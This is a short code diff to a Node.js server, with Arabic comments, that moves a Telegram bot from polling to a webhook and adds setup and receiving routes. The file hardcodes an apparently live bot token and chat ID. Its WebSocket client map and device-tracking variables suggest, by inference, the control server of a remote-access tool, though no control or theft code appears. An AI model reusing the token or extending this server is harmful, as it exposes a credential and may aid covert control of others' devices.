@@ -9,20 +9,36 @@ const axios = require("axios");
 
 const token = '8364245146:AAHyb2VjNIWY5hqe5vw-J3ZLncTmVzl4Btg'
 const id = '919792612'
-const address = 'https://https://thyezwn-thyezenaliah-9z59.bolt.host/'
+const address = 'https://thyezwn-thyezenaliah-9z59.bolt.host/' // تم إصلاح الرابط
 
 const app = express();
 const appServer = http.createServer(app);
 const appSocket = new webSocket.Server({server: appServer});
-const appBot = new TelegramBot(token, {polling: true});
-const appClients = new Map()
+const appBot = new TelegramBot(token); // تم إزالة polling: true
 
+const appClients = new Map()
 const upload = multer();
 app.use(bodyParser.json());
 
 let currentUuid = ''
 let currentNumber = ''
 let currentTitle = ''
+
+// مسار إعداد الويبهوك (أرسل هذا الرابط في BotFather ليتم ربط البوت)
+app.get('/setwebhook', async (req, res) => {
+    try {
+        await axios.get(`https://api.telegram.org/bot${token}/setWebhook?url=${address}webhook`);
+        res.send('Webhook set successfully!');
+    } catch (error) {
+        res.send('Error setting webhook: ' + error.message);
+    }
+});
+
+// مسار استقبال رسائل تيليجرام (هذا هو المفقود سابقاً)
+app.post(`/webhook`, (req, res) => {
+    appBot.processUpdate(req.body);
+    res.sendStatus(200);
+});
 
 app.get('/', function (req, res) {
     res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
